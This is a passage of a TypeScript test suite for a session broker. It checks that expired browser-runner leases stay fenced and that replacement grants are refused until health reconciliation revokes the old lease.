      await expect(broker.reconcileSession(operationFor(lease))).resolves.toMatchObject({
        state: 'revoked',
        revocationReason: 'runner_reconciled',
      });
      expect(repository.records.get(binding.bindingId)).toMatchObject({
        providerHealth: 'healthy',
        sessionHealth: 'healthy',
        healthObservedAt: clock,
      });
      await expect(broker.requestSession(requestFor(grant))).resolves.toMatchObject({ state: 'active' });
    });

    it('keeps an expired mounted runner fenced past nominal expiry until health reconciliation', async () => {
      const binding = await enrolledProfile('expired-runner-profile');
      const grant = await createGrant(binding);
      const lease = await broker.requestSession(requestFor(grant));
      const operation = operationFor(lease);

      clock = '2026-08-21T12:06:00.000Z';
      await expect(broker.useSession({
        ...operation,
        action: { type: 'readText', selector: 'body' },
      })).rejects.toBeInstanceOf(ConflictError);
      expect(leaseRepository.leases.get(lease.id)).toMatchObject({
        state: 'uncertain',
        revocationReason: 'lease_expired_pending_reconciliation',
      });
      expect(repository.records.get(binding.bindingId)).toMatchObject({
        providerHealth: 'degraded',
        sessionHealth: 'unknown',
      });

      Object.assign(repository.records.get(binding.bindingId)!, {
        providerHealth: 'healthy',
        sessionHealth: 'healthy',
        healthObservedAt: clock,
      });
      const replacementGrant = await createGrant(binding);
      await expect(broker.requestSession(requestFor(replacementGrant)))
        .rejects.toBeInstanceOf(ConflictError);

      runnerHost.reconciliationHealth = {
        provider: 'healthy',
        session: 'healthy',
        observedAt: clock,
      };
      await expect(broker.reconcileSession(operation)).resolves.toMatchObject({
        state: 'revoked',
        revocationReason: 'runner_reconciled',
      });
      await expect(broker.requestSession(requestFor(replacementGrant)))
        .resolves.toMatchObject({ state: 'active' });
    });
  });
});
